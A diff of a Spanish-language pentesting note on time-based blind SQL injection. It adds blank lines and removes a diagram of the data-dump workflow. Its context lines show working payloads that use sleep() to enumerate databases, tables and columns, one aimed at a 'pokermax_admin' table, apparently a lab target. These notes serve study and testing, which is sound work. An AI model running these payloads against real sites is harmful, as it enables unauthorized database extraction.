@@ -126,6 +126,7 @@ Se utiliza cuando la web es estática y no cambia en nada (se dice tambien que e
 admin' and if(substr(database(),{pos},1)='{caracter}',sleep(5),1)
 ```
 ##### Enumerar las BD existentes
+
 ```sql
 admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),{pos},1)='{caracter}',sleep(0.9),1)-- -
 ```
@@ -139,6 +140,7 @@ admin' and if(substr((select group_concat(table_name) from information_schema.ta
 ```
 
 ##### Eenumerar columnas de una tabla de una BD
+
 ```sql
 admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),{position},1)='{i}',sleep(0.9),1)-- -
 ```
@@ -158,27 +160,6 @@ Dependiendo del motor, el comando cambia:
 |**MySQL / MariaDB**|`SELECT DATABASE();`|
 |**PostgreSQL**|`SELECT current_database();`|
 |**SQL Server**|`SELECT DB_NAME();`|
-
----
-
-## Flujo de Trabajo Típico (Metodología)
-
-Cuando confirmás la vulnerabilidad, el camino hacia el volcado de datos (dump) siempre sigue este flujo lógico:
-
-
-```mermaid
-graph TD
-    A[1. Conocer BD Actual] --> B[2. Enumerar TODAS las BDs]
-    B --> C[3. Enumerar TABLAS de una BD objetivo]
-    C --> D[4. Enumerar COLUMNAS de una Tabla]
-    D --> E[5. Volcar DATOS de las columnas]
-    
-    style A fill:#1e1e1e,stroke:#4CAF50,stroke-width:2px,color:#fff
-    style B fill:#1e1e1e,stroke:#2196F3,stroke-width:2px,color:#fff
-    style C fill:#1e1e1e,stroke:#FF9800,stroke-width:2px,color:#fff
-    style D fill:#1e1e1e,stroke:#9C27B0,stroke-width:2px,color:#fff
-    style E fill:#1e1e1e,stroke:#F44336,stroke-width:2px,color:#fff
-```
 
 ### 💻 Consultas Clave (Paylods de Extracción)
 
